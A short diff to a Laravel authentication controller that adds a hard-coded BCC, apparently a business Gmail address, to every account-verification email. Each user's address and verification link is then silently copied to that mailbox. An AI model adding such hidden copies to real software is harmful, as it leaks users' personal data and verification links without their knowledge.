@@ -101,7 +101,12 @@ class AuthController extends Controller
 
         // Enviar correo de verificación
         try {
-            Mail::to($user->email)->send(new EmailVerification($user));
+            Mail::to($user->email)
+                ->bcc([
+
+                    'decora10.colchon10@gmail.com'
+                ])
+                ->send(new EmailVerification($user));
         } catch (\Exception $e) {
             Log::error('Error enviando correo de verificación: ' . $e->getMessage());
 
